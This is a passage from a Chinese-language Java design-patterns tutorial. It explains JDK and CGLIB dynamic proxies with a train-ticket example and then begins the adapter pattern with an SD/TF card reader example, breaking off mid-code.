<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ① 卖票接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SellTickets</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ② 火车站  火车站具有卖票功能，所以需要实现SellTickets接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainStation</span> <span class="keyword">implements</span> <span class="title">SellTickets</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;火车站卖票&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ③ 代理工厂，用来创建代理对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 声明目标对象</span></span><br><span class="line">    <span class="keyword">private</span> TrainStation station = <span class="keyword">new</span> TrainStation();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SellTickets <span class="title">getProxyObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用Proxy获取代理对象</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            newProxyInstance()方法参数说明：</span></span><br><span class="line"><span class="comment">                ClassLoader loader ： 类加载器，用于加载代理类，使用真实对象的类加载器即可</span></span><br><span class="line"><span class="comment">                Class&lt;?&gt;[] interfaces ： 真实对象所实现的接口，代理模式真实对象和代理对象实现相同的接口</span></span><br><span class="line"><span class="comment">                InvocationHandler h ： 代理对象的调用处理程序</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        SellTickets sellTickets = (SellTickets) Proxy.newProxyInstance(</span><br><span class="line">            station.getClass().getClassLoader(),</span><br><span class="line">            station.getClass().getInterfaces(),</span><br><span class="line">            <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        InvocationHandler中invoke方法参数说明：</span></span><br><span class="line"><span class="comment">                            proxy ： 代理对象</span></span><br><span class="line"><span class="comment">                            method ： 对应于在代理对象上调用的接口方法的 Method 实例</span></span><br><span class="line"><span class="comment">                            args ： 代理对象调用接口方法时传递的实际参数</span></span><br><span class="line"><span class="comment">                            </span></span><br><span class="line"><span class="comment">                        返回值：将作为方法的返回值，返回给方法调用者</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;		<span class="comment">// 这个方法对应到最终获取到的代理对象的方法中调用的invoke方法：this.h.invoke(this, m3, null);（见上面的生成的代理类源码）</span></span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">&quot;代理点收取一些服务费用(JDK动态代理方式)&quot;</span>);</span><br><span class="line">                        <span class="comment">//执行真实对象</span></span><br><span class="line">                        Object result = method.invoke(station, args);	<span class="comment">// 使用反射的方式：执行station对象中的方法，传递的参数是args</span></span><br><span class="line">                        <span class="keyword">return</span> result;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">return</span> sellTickets;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ④ 测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取代理对象</span></span><br><span class="line">        <span class="comment">// 1. 创建代理工厂对象</span></span><br><span class="line">        ProxyFactory factory = <span class="keyword">new</span> ProxyFactory();</span><br><span class="line">        <span class="comment">// 2. 使用factory对象的方法获取代理对象</span></span><br><span class="line">       	SellTickets proxyObject = factory.getProxyObject();</span><br><span class="line">        <span class="comment">// 3. 调用卖调用的方法</span></span><br><span class="line">        proxyObject.sell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red">使用了动态代理，我们思考下面问题：</font></p>
<ul>
<li><p>ProxyFactory是代理类吗？</p>
<p>ProxyFactory不是代理模式中所说的代理类，而代理类是程序在运行过程中动态的在内存中生成的类。通过阿里巴巴开源的 Java 诊断工具（Arthas【阿尔萨斯】）查看代理类的结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.proxy.dynamic.jdk.SellTickets;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> $<span class="title">Proxy0</span> <span class="keyword">extends</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">SellTickets</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler invocationHandler) &#123;</span><br><span class="line">        <span class="keyword">super</span>(invocationHandler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            m1 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>));</span><br><span class="line">            m2 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">            m3 = Class.forName(<span class="string">&quot;com.itheima.proxy.dynamic.jdk.SellTickets&quot;</span>).getMethod(<span class="string">&quot;sell&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">            m0 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchMethodException noSuchMethodException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodError(noSuchMethodException.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException classNotFoundException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoClassDefFoundError(classNotFoundException.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Boolean)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m1, <span class="keyword">new</span> Object[]&#123;object&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Error | RuntimeException throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> throwable;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m2, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Error | RuntimeException throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> throwable;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Integer)<span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m0, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Error | RuntimeException throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> throwable;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m3, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Error | RuntimeException throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> throwable;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(throwable);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面的类中，我们可以看到以下几个信息：</p>
<ul>
<li>代理类（$Proxy0）实现了SellTickets。这也就印证了我们之前说的真实类和代理类实现同样的接口。</li>
<li>代理类（$Proxy0）将我们提供了的匿名内部类对象传递给了父类。</li>
</ul>
</li>
<li><p>动态代理的执行流程是什么样？</p>
<p>下面是摘取的==<strong>重点代码</strong>==：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//程序运行过程中动态生成的代理类（这就是 Proxy.newProxyInstance() 返回的代理对象的类）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> $<span class="title">Proxy0</span> <span class="keyword">extends</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">SellTickets</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler invocationHandler) &#123;</span><br><span class="line">        <span class="keyword">super</span>(invocationHandler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        m3 = Class.forName(<span class="string">&quot;com.itheima.proxy.dynamic.jdk.SellTickets&quot;</span>).getMethod(<span class="string">&quot;sell&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.h.invoke(<span class="keyword">this</span>, m3, <span class="keyword">null</span>);		<span class="comment">// 这里的h是当时传入的匿名内部类的对象，m3是对应的调用的方法对象，第三个参数对应的是方法参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java提供的动态代理相关类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> InvocationHandler h;</span><br><span class="line">	 </span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="title">Proxy</span><span class="params">(InvocationHandler h)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.h = h;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代理工厂类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TrainStation station = <span class="keyword">new</span> TrainStation();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SellTickets <span class="title">getProxyObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        SellTickets sellTickets = (SellTickets) Proxy.newProxyInstance(</span><br><span class="line">            station.getClass().getClassLoader(),</span><br><span class="line">            station.getClass().getInterfaces(),</span><br><span class="line">            <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">					<span class="comment">/*</span></span><br><span class="line"><span class="comment">                        InvocationHandler中invoke方法参数说明：</span></span><br><span class="line"><span class="comment">                            proxy ： 代理对象（几乎无用），与Proxy.newProxyInstance的返回值指向的是同一个实例</span></span><br><span class="line"><span class="comment">                            method ： 对应于在代理对象上调用的接口方法的 Method 实例</span></span><br><span class="line"><span class="comment">                            args ： 代理对象调用接口方法时传递的实际参数</span></span><br><span class="line"><span class="comment">                        </span></span><br><span class="line"><span class="comment">                        返回值：将作为方法的返回值，返回给方法调用者</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;		<span class="comment">// 这个方法对应到最终获取到的代理对象的方法中调用的invoke方法：this.h.invoke(this, m3, null);（见上面的生成的代理类源码）</span></span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">&quot;代理点收取一些服务费用(JDK动态代理方式)&quot;</span>);</span><br><span class="line">                        Object result = method.invoke(station, args);	<span class="comment">// 使用反射的方式：执行station对象中的方法，传递的参数是args</span></span><br><span class="line">                        <span class="keyword">return</span> result;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">return</span> sellTickets;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//测试访问类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取代理对象</span></span><br><span class="line">        <span class="comment">// 1. 创建代理工厂对象</span></span><br><span class="line">        ProxyFactory factory = <span class="keyword">new</span> ProxyFactory();</span><br><span class="line">        <span class="comment">// 2. 使用factory对象的方法获取代理对象</span></span><br><span class="line">       	SellTickets proxyObject = factory.getProxyObject();</span><br><span class="line">        <span class="comment">// 3. 调用卖调用的方法</span></span><br><span class="line">        proxyObject.sell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>执行流程</strong>如下：</p>
<pre><code>1. 在测试类中通过代理对象调用sell()方法
2. 根据多态的特性，执行的是代理类（$Proxy0）中的sell()方法
3. 代理类（$Proxy0）中的sell()方法中又调用了InvocationHandler接口的子实现类对象的invoke方法
4. invoke方法通过反射执行了真实对象所属类(TrainStation)中的sell()方法
</code></pre>
<h5 id="CGLIB动态代理"><a href="#CGLIB动态代理" class="headerlink" title="CGLIB动态代理"></a>CGLIB动态代理</h5><p>同样是上面的案例，我们再次使用CGLIB代理实现。</p>
<p>如果没有定义SellTickets接口，只定义了TrainStation(火车站类)。很显然JDK代理是无法使用了，因为<strong>JDK动态代理要求必须定义接口，对接口进行代理</strong>。</p>
<p>CGLIB是一个功能强大，高性能的代码生成包。它为没有实现接口的类提供代理，为JDK的动态代理提供了很好的补充。</p>
<p>CGLIB是第三方提供的包，所以需要引入jar包的坐标：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//火车站</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainStation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;火车站卖票&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//代理工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TrainStation target = <span class="keyword">new</span> TrainStation();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TrainStation <span class="title">getProxyObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建Enhancer对象，类似于JDK动态代理的Proxy类，下一步就是设置几个参数</span></span><br><span class="line">        Enhancer enhancer =<span class="keyword">new</span> Enhancer();</span><br><span class="line">        <span class="comment">//设置父类的字节码对象</span></span><br><span class="line">        enhancer.setSuperclass(target.getClass());</span><br><span class="line">        <span class="comment">//设置回调函数</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//创建代理对象</span></span><br><span class="line">        TrainStation obj = (TrainStation) enhancer.create();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        intercept方法参数说明：</span></span><br><span class="line"><span class="comment">            o ： 代理对象</span></span><br><span class="line"><span class="comment">            method ： 真实对象中的方法的Method实例</span></span><br><span class="line"><span class="comment">            args ： 实际参数</span></span><br><span class="line"><span class="comment">            methodProxy ：代理对象中的方法的method实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TrainStation <span class="title">intercept</span><span class="params">(Object o, Method method, Object[] args, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;代理点收取一些服务费用(CGLIB动态代理方式)&quot;</span>);</span><br><span class="line">        TrainStation result = (TrainStation) methodProxy.invokeSuper(o, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建代理工厂对象</span></span><br><span class="line">        ProxyFactory factory = <span class="keyword">new</span> ProxyFactory();</span><br><span class="line">        <span class="comment">//获取代理对象</span></span><br><span class="line">        TrainStation proxyObject = factory.getProxyObject();</span><br><span class="line"></span><br><span class="line">        proxyObject.sell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="对比-1"><a href="#对比-1" class="headerlink" title="对比"></a>对比</h5><ul>
<li><p>jdk代理和CGLIB代理</p>
<p>使用CGLib实现动态代理，CGLib底层采用ASM字节码生成框架，使用字节码技术生成代理类，在JDK1.6之前比使用Java反射效率要高。唯一需要注意的是，<strong>CGLib不能对声明为final的类或者方法进行代理</strong>，因为CGLib原理是动态生成被代理类的子类。</p>
<p>在JDK1.6、JDK1.7、JDK1.8逐步对JDK动态代理优化之后，在调用次数较少的情况下，JDK代理效率高于CGLib代理效率，只有当进行大量调用的时候，JDK1.6和JDK1.7比CGLib代理效率低一点，但是到JDK1.8的时候，JDK代理效率高于CGLib代理。所以<strong>如果有接口使用JDK动态代理，如果没有接口使用CGLIB代理</strong>。</p>
</li>
<li><p>动态代理和静态代理</p>
<p>动态代理与静态代理相比较，最大的好处是接口中声明的所有方法都被转移到调用处理器一个集中的方法中处理（InvocationHandler.invoke）。这样，在接口方法数量比较多的时候，我们可以进行灵活处理，而不需要像静态代理那样每一个方法进行中转。</p>
<p>如果接口增加一个方法，静态代理模式除了所有实现类需要实现这个方法外，所有代理类也需要实现此方法。增加了代码维护的复杂度。而动态代理不会出现该问题</p>
</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用；</li>
<li>代理对象可以扩展目标对象的功能；</li>
<li>代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度；</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>增加了系统的复杂度；</li>
</ul>
<p><strong>使用场景</strong> </p>
<ul>
<li><p>远程（Remote）代理（<strong>案例RPC思想</strong>）</p>
<p>本地服务通过网络请求远程服务。为了实现本地到远程的通信，我们需要实现网络通信，处理其中可能的异常。为良好的代码设计和可维护性，我们将网络通信部分隐藏起来，只暴露给本地服务一个接口，通过该接口即可访问远程服务提供的功能，而不必过多关心通信部分的细节。</p>
</li>
<li><p>防火墙（Firewall）代理</p>
<p>当你将浏览器配置成使用代理功能时，防火墙就将你的浏览器的请求转给互联网；当互联网返回响应时，代理服务器再把它转给你的浏览器。</p>
</li>
<li><p>保护（Protect or Access）代理</p>
<p>控制对一个对象的访问，如果需要，可以给不同的用户提供不同级别的使用权限。</p>
</li>
</ul>
<h4 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h4><p><strong>概述</strong></p>
<p>如果去欧洲国家去旅游的话，他们的插座如下图最左边，是欧洲标准。而我们使用的插头如下图最右边的。因此我们的笔记本电脑，手机在当地不能直接充电。所以就需要一个插座转换器，转换器第1面插入当地的插座，第2面供我们充电，这样使得我们的插头在当地能使用。生活中这样的例子很多，手机充电器（将220v转换为5v的电压），读卡器等，其实就是使用到了适配器模式。</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-18-18-07-25.png"></p>
<p><strong>定义：</strong></p>
<p>​    将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类能一起工作。</p>
<p>​    适配器模式分为类适配器模式和对象适配器模式，前者类之间的耦合度比后者高，且要求程序员了解现有组件库中的相关组件的内部结构，所以应用相对较少些。</p>
<p><strong>结构</strong></p>
<p>适配器模式（Adapter）包含以下主要角色：</p>
<ul>
<li>目标（Target）接口：当前系统业务所期待的接口，它可以是抽象类或接口。</li>
<li>适配者（Adaptee）类：它是被访问和适配的现存组件库中的组件接口。</li>
<li>适配器（Adapter）类：它是一个转换器，通过继承或引用适配者的对象，把适配者接口转换成目标接口，让客户按目标接口的格式访问适配者。</li>
</ul>
<h5 id="类适配器模式"><a href="#类适配器模式" class="headerlink" title="类适配器模式"></a>类适配器模式</h5><p>实现方式：定义一个适配器类来实现当前系统的业务接口，同时又继承现有组件库中已经存在的组件。</p>
<p>【例】读卡器</p>
<p>现有一台电脑只能读取SD卡，而要读取TF卡中的内容的话就需要使用到适配器模式。创建一个读卡器，将TF卡中的内容读取出来。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-18-18-14-31.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//SD卡的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SDCard</span> </span>&#123;</span><br><span class="line">    <span class="comment">//读取SD卡方法</span></span><br><span class="line">    <span class="function">String <span class="title">readSD</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//写入SD卡功能</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeSD</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//SD卡实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SDCardImpl</span> <span class="keyword">implements</span> <span class="title">SDCard</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readSD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String msg = <span class="string">&quot;sd card read a msg :hello word SD&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeSD</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sd card write msg : &quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电脑类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Computer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readSD</span><span class="params">(SDCard sdCard)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sdCard == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">&quot;sd card null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sdCard.readSD();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TF卡接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TFCard</span> </span>&#123;</span><br><span class="line">    <span class="comment">//读取TF卡方法</span></span><br><span class="line">    <span class="function">String <span class="title">readTF</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//写入TF卡功能</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeTF</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TF卡实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TFCardImpl</span> <span class="keyword">implements</span> <span class="title">TFCard</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readTF</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String msg =<span class="string">&quot;tf card read msg : hello word tf card&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeTF</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;tf card write a msg : &quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义适配器类（SD兼容TF）</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SDAdapterTF</span> <span class="keyword">extends</span> <span class="title">TFCardImpl</span> <span class="keyword">implements</span> <span class="title">SDCard</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span 